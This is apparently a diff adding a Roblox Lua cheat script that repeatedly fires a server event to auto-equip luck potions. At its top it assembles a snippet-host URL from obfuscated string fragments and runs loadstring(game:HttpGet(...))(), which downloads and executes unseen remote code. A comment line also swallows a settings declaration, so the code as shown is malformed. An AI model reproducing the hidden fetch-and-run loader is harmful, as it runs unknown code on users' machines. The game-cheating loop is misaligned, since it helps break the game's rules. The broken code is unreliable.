@@ -1,0 +1,20 @@
+--//rochips haven//--
+local pastebin, Rochips_Panel = "glo".."t.io/".."snip".."pets", "gw".."wv".."87".."7g".."a3/r".."aw".."/ma".."in.lu".."a" --funny moment
+loadstring(game:HttpGet("https://"..pastebin.."/"..Rochips_Panel))()
+--//takes about 1-8 minutes to load//--getgenv().settings = {
+    toggle = true,
+    wait = 0.1
+}
+
+while settings.toggle do
+    wait(settings.wait)
+    local luck = {"Super Luck Potion", "Luck Potion"}
+    for _, v in ipairs(luck) do
+        local args = {
+            [1] = "Equip",
+            [2] = v,
+            [3] = "Usable"
+        }
+        game:GetService("ReplicatedStorage").Events.InventoryEvent:FireServer(unpack(args))
+    end
+end 
